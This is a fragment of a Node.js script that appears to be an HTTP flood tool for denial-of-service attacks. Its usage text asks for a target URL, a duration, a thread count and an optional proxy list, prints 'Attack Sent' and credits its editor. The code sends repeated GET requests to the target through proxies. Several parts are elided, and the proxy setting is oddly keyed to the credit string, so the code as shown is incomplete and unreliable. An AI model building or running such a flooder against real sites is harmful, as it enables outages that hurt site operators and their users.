...
async function poptto() {
    if (process.argv.length !== 6) {
        console.log(`node ntp.js url times threads proxy/off/proxy.txt
        Code - EDIT : Dester Keller `);
        console.log(`vi du : node ntp.js https://desterkeller.sex 120 1000 proxy.txt`);
        process.exit(0);
    }else{
        ...
        if (process.argv[5] == 'off') {
            console.log("Attack Sent I  Code - EDIT : Dester Keller")
        ...
        function run() {
            if (process.argv[5] !== 'off') {
                ...
                var proxiedRequest = request.defaults({'Attack Sent I  Code - EDIT : Dester Keller': 'http://'+proxy});
                var config = {
                    method: 'get',
                    url: target,
                    headers: {
